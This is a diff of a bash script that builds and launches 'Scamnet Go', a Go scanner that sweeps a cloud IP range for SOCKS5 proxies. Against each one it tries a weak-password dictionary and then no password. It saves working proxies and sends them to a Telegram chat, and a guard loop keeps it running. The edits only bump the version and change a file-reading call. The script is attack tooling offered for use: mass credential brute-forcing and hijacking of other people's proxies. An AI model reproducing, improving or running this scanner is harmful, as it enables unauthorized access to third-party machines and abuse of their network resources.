@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet Go v1.5 OTC TG:soqunla （终极防截断版）
+# main.sh - Scamnet Go v1.6 OTC TG:soqunla （兼容所有 Go 版本 · 终极稳定版）
 set -euo pipefail
 IFS=$'\n\t'
 RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
@@ -17,7 +17,6 @@ if ! command -v go >/dev/null 2>&1; then
     exit 1
 fi
 
-# 默认高命中段
 DEFAULT_START="47.80.0.0"
 DEFAULT_END="47.86.255.255"
 read_ip() { echo -e "${YELLOW}$1（默认: $2）:${NC}"; read -r input; eval "$3=\"\${input:-$2}\""; }
@@ -44,7 +43,6 @@ echo -e "${YELLOW}Telegram Chat ID（可选）:${NC}"; read -r TELEGRAM_CHATID
 log "正在创建弱口令字典 $WEAK_FILE ..."
 cat > "$WEAK_FILE" << 'EOF'
 admin:admin
-::
 0:0
 00:00
 000:000
@@ -368,9 +366,9 @@ zzzzz:zzzzz
 zzzzzz:zzzzzz
 EOF
 
-log "正在编译 Go 扫描器（v1.5 外部字典版 TG:soqunla）..."
+log "正在编译 Go 扫描器（v1.6 兼容所有 Go 版本 TG:soqunla）..."
 
-# ============ Go 源码 ============
+# ============ Go 源码（已修复 ioutil.ReadFile） ============
 cat > scamnet.go << 'EOF'
 package main
 
@@ -421,7 +419,7 @@ type IPInfo struct {
 }
 
 func loadWeakPairs() {
-	data, err := os.ReadFile(weakFile)
+	data, err := ioutil.ReadFile(weakFile)
 	if err != nil { return }
 	lines := strings.Split(string(data), "\n")
 	for _, line := range lines {
@@ -465,7 +463,7 @@ func main() {
 	fmt.Printf("[*] 总任务: %d | 每批: %d | 批次: %d | 弱口令: %d 条\n", total, cfg.BatchSize, batchCount, len(weakPairs))
 
 	f, _ := os.OpenFile(validFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
-	f.WriteString("# Scamnet Go v1.5 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
+	f.WriteString("# Scamnet Go v1.6 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	f.Close()
 
 	for batchStart := uint64(0); batchStart < total; batchStart += uint64(cfg.BatchSize) {
@@ -516,7 +514,6 @@ func scanTarget(target string) {
 	ip := parts[0]
 	port, _ := strconv.Atoi(parts[1])
 
-	// 弱口令优先
 	for _, p := range weakPairs {
 		if ok, lat, origin := testSocks5(ip, port, p[0], p[1]); ok && lat < 500 {
 			saveAndNotify(ip, port, p[0], p[1], origin, lat)
@@ -524,7 +521,6 @@ func scanTarget(target string) {
 		}
 	}
 
-	// 无密码最后
 	if ok, lat, origin := testSocks5(ip, port, "", ""); ok && lat < 500 {
 		saveAndNotify(ip, port, "", "", origin, lat)
 	}
@@ -633,7 +629,7 @@ func dedupAndReport() {
 	sort.Strings(sorted)
 
 	out, _ := os.Create(validFile + ".tmp")
-	out.WriteString("# Scamnet Go v1.5 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
+	out.WriteString("# Scamnet Go v1.6 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	for _, l := range sorted { out.WriteString(l + "\n") }
 	out.Close()
 	os.Rename(validFile+".tmp", validFile)
@@ -695,7 +691,7 @@ TELEGRAM_TOKEN="$TELEGRAM_TOKEN"
 TELEGRAM_CHATID="$TELEGRAM_CHATID"
 
 > "\$LOG"
-echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - Scamnet v1.5 启动" | tee -a "\$LOG"
+echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - Scamnet v1.6 启动" | tee -a "\$LOG"
 echo "[GUARD] 范围: \$START_IP ~ \$END_IP | 端口: \$PORTS" | tee -a "\$LOG"
 
 while :; do
